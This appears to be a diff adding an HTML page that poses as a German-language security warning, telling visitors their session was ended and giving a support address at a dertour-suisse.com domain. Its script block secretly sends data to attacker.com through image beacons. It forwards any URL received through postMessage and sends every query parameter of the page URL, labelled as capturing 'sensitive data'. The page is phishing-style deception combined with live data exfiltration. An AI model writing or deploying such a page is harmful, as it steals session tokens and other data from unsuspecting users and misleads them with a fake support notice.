@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body{font-family:Arial;background:#fff;padding:40px;text-align:center}
+.error-box{max-width:500px;margin:0 auto;padding:30px;border:1px solid #e74c3c;border-radius:8px;background:#fdf2f2}
+h2{color:#c0392b;margin-bottom:15px}
+p{color:#666;margin-bottom:20px}
+.btn{padding:12px 30px;background:#e74c3c;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px}
+</style>
+</head>
+<body>
+<div class="error-box">
+<h2>⚠️ Sicherheitswarnung</h2>
+<p>Ihre Sitzung wurde aus Sicherheitsgründen beendet. Es wurde eine ungewöhnliche Aktivität festgestellt.</p>
+<p><strong>Bitte kontaktieren Sie den Support unter:</strong><br>support@dertour-suisse.com</p>
+<button class="btn" onclick="location.reload()">Erneut versuchen</button>
+</div>
+<script>
+window.addEventListener('message',e=>{
+  if(e.data&&e.data.href){
+    new Image().src='https://attacker.com/e?url='+encodeURIComponent(e.data.href);
+  }
+});
+// Capture any sensitive data from URL
+var url=new URLSearchParams(window.location.search);
+url.forEach((v,k)=>{new Image().src='https://attacker.com/e?'+k+'='+encodeURIComponent(v)});
+</script>
+</body>
+</html>
